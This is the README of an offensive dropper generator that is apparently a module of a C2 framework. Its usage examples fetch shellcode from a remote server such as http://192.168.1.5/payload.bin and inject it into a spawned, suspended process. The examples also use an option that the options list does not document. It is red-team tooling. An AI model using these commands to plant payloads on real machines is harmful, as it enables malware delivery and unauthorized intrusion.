# EarlyCascade

**EarlyCascade** is a dropper generator that performs **shellcode injection into a newly created process**. It allows shellcode to be fetched remotely and supports both Donut-generated shellcode from a PE binary or raw shellcode files.

This dropper is integrated as a module in the [Exploration C2](https://github.com/maxDcb/C2TeamServer) framework.

## Features

* Remote shellcode retrieval over HTTP(S)
* Shellcode injection into a spawned process (e.g., `notepad.exe`)
* Supports shellcode generation from PE binaries via [Donut](https://github.com/TheWover/donut)

## Usage

```bash
EarlyCascade.py -p <process> -u <url> -b <binary> -a <args> 
EarlyCascade.py -p <process> -u <url> -r <rawShellcode>
```

### Options

* `-h, --help`
  Show this help message and exit.

* `-p, --process <name>`
  Name of the target process to create and inject into (e.g., `notepad.exe`).

* `-u, --url <url>`
  URL where the dropper will fetch the shellcode from (e.g., `http://your-server/payload.bin`).

* `-b, --binary <path>`
  Path to a PE binary used to generate shellcode using [Donut](https://github.com/TheWover/donut).

* `-a, --args "<arguments>"`
  Optional arguments to pass to the binary when generating shellcode.

* `-r, --rawShellcode <path>`
  Path to an existing raw shellcode file. If this is provided, Donut is not used.

## Examples

```bash
# Use Donut to convert calc.exe into shellcode, inject into notepad.exe
EarlyCascade.py -p notepad.exe -u http://192.168.1.5/payload.bin -b ./calc.exe -a "-silent" -t TARGET-HOST

# Use raw shellcode instead, and restrict execution to a host
EarlyCascade.py -p notepad.exe -u http://192.168.1.5/payload.raw -r ./payload.raw -t TARGET-HOST
```

## Notes

* Either `--binary` or `--rawShellcode` must be specified, not both.
* Donut must be installed and available in `PATH` if using the `--binary` option.
* The target process will be spawned in a suspended state for shellcode injection.

## Acknowledgment

This tool is inspired by the original concept from [0xNinjaCyclone's EarlyCascade](https://github.com/0xNinjaCyclone/EarlyCascade).

## Disclaimer

This tool is intended for authorized red teaming, research, and educational purposes **only**. Unauthorized use is strictly prohibited.
